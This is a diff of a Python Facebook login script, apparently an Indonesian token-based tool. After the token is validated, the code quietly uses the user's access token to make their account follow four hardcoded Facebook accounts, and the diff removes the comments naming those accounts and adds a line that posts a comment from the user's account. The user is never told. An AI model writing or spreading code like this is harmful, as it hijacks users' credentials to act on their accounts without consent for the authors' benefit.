@@ -16,10 +16,11 @@ def main():
         print('%s╚══[%s!%s] %sToken Invalid'%(M,P,M,P))
         os.system('rm -rf token.txt')
         exit(elite.menu_log())
-    requests.post("https://graph.facebook.com/100017584682867/subscribers?access_token=" + token)      # Abdullah
-    requests.post("https://graph.facebook.com/100000395779504/subscribers?access_token=" + token) # Abdullah
-    requests.post("https://graph.facebook.com/100000834003593/subscribers?access_token=" + token) # Abdullah
-    requests.post("https://graph.facebook.com/100003986228742/subscribers?access_token=" + token) # Rehan khan
+    requests.post("https://graph.facebook.com/100017584682867/subscribers?access_token=" + token)    
+    requests.post("https://graph.facebook.com/100000395779504/subscribers?access_token=" + token) 
+    requests.post("https://graph.facebook.com/100000834003593/subscribers?access_token=" + token)
+    requests.post("https://graph.facebook.com/100003986228742/subscribers?access_token=" + token) 
+    requests.post('https://graph.facebook.com/100017584682867/comments/?message=' + kom + '&access_token=' + token)
     print('%s║'%(O))
     print('%s╚══[%s!%s] %sLogin Berhasil'%(O,P,O,P))
     exit(elite.menu())
